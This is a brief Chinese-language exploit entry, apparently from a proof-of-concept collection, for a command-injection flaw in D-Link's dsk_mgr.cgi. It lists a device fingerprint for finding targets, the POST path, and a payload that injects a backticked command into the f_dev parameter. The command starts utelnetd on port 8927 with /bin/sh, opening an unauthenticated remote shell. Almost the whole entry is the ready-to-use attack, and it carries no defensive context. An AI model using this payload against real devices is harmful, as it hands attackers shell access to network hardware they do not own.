# D-Linkdsk_mgr.cgi存在命令执行漏洞

D-Linkdsk_mgr.cgi ｜ 命令执行 ｜ —
- **指纹**：`"D-Link-DIR"`
- **请求**：`POST /cgi-bin/dsk\_mgr.cgi HTTP/1.1`

**Payload**
```
cmd=FMT\_rebuild\_diskmgr\&f\_dev=`utelnetd -p 8927 -l /bin/sh`\&f\_raidlevel=\&f\_auto\_sync=
```
- **响应特征**：200